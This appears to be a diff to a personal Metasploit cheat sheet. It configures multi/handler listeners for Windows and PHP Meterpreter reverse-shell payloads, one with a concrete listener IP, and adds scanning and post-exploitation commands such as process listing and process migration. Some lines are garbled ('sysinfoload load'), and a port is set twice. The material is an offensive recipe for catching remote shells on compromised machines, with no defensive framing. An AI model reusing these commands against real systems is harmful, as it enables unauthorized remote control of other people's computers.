@@ -55,7 +55,7 @@ MSF PS .SET
 use multi/handler
 set payload windows/meterpreter/reverse_https
 set LPORT 443
-LHOST 0.0.0.0
+set LHOST 0.0.0.0
 set ExitOnSession false
 exploit -j
 
@@ -67,5 +67,25 @@ git clone https://github.com/rapid7/metasploit-framework.git
 gem install bundle
 bundle install
 
+msfconsole
+db_nmap
+hosts -h
+services -h
+services
+ services -c port,name,state
+msfconsole
+db_nmap IP ADDRESS
+getpid
+ps -S explorer.exe
+sysinfoload load
+migrate PID
+sysinfo
 
+ set PAYLOAD php/meterpreter/reverse_tcp
+ set LPORT 443
+ set LHOST 159.203.14.45
+ set LPORT 4444
+ set exitonsession false
+ exploit -j
 
+ 
